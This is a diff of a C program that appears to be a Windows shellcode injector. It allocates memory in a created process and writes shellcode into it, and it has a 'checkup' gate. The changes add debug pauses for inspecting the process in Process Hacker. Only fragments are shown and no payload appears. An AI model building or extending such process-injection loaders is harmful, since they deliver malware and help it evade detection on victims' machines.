@@ -106,7 +106,7 @@ BOOL checkup()
 
 }
 
-int main()
+int main(int argc, char **argv)
 {
     if (!checkup()) {
         fprintf(stderr, "Bailing out\n");
@@ -159,6 +159,11 @@ int main()
         startup_info,
         process_info);
 
+#ifdef DEBUGGING
+	fprintf(stderr, "process (%d) created, check with processhacker (press ENTER to continue)\n", GetProcessId(process_info->hProcess));
+	getchar();
+#endif
+
     // Allocate Virtual Memory
     code_size = (SIZE_T)shellcode_size;
     ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -170,7 +175,8 @@ int main()
     }
     else {
 #ifdef DEBUGGING
-        fprintf(stderr, "Virtual Memory allocated at %llx, allocated size %d\n", (unsigned __int64)start_address, (unsigned int)code_size);
+        fprintf(stderr, "Virtual Memory allocated at %llx, allocated size %d, check with processhacker (press ENTER to continue)\n", (unsigned __int64)start_address, (unsigned int)code_size);
+		getchar();
 #endif
     }
 
@@ -188,7 +194,8 @@ int main()
     }
     else {
 #ifdef DEBUGGING
-        fprintf(stderr, "Memory Written\n");
+        fprintf(stderr, "Memory Written, check with processhacker (press ENTER to continue)\n");
+		getchar();
 #endif
     }
 
